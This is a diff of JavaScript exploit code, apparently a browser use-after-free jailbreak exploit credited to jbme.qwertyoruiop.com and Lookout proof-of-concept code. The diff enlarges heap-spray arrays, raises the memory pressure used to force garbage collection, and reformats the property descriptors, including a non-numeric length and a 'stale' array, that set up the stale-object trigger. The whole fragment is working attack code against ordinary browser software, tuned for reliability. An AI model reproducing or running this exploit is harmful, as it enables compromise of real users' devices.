@@ -1,6 +1,6 @@
 // Based on https://jbme.qwertyoruiop.com/
 // and lookout PoC code.
-var bufs = new Array(100);
+var bufs = new Array(10000);
 var stale = 0;
 
 
@@ -56,7 +56,7 @@ function d2u(d) {
 }
 
 // dgc attempts to trigger a garbage collection by allocating a large amount of memory
-var pressure = new Array(100);
+var pressure = new Array(150);
 dgc = function() {
 	for(var i = 0; i < pressure.length; i++) {
 		pressure[i] = new Uint32Array(0x10000);
@@ -122,42 +122,18 @@ function go_() {
 		return 10;
 	};
 	var props = {
-		p0: {
-			value: 0
-		},
-		p1: {
-			value: 1
-		},
-		p2: {
-			value: 2
-		},
-		p3: {
-			value: 3
-		},
-		p4: {
-			value: 4
-		},
-		p5: {
-			value: 5
-		},
-		p6: {
-			value: 6
-		},
-		p7: {
-			value: 7
-		},
-		p8: {
-			value: 8
-		},
-		length: {
-			value: not_number
-		},
-		stale: {
-			value: arr
-		},
-		after: {
-			value: 666
-		}
+		p0: {value: 0},
+		p1: {value: 1},
+		p2: {value: 2},
+		p3: {value: 3},
+		p4: {value: 4},
+		p5: {value: 5},
+		p6: {value: 6},
+		p7: {value: 7},
+		p8: {value: 8},
+		length: {value: not_number},
+		stale: {value: arr},
+		after: {value: 666}
 	};
 	var target = [];
 	var before_len = arr.length;
